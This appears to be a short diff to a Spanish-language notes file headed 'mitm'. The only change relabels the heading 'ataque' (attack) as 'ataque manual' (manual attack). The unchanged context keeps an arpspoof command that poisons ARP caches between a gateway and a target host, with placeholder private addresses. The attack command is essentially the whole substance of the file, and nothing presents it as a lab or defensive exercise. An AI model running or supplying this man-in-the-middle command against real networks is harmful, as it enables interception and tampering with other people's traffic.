@@ -1,6 +1,6 @@
 # mitm
 
-ataque:
+ataque manual:
 
 arpspoof -r -t 192.168.x.1 192.168.x.5
 
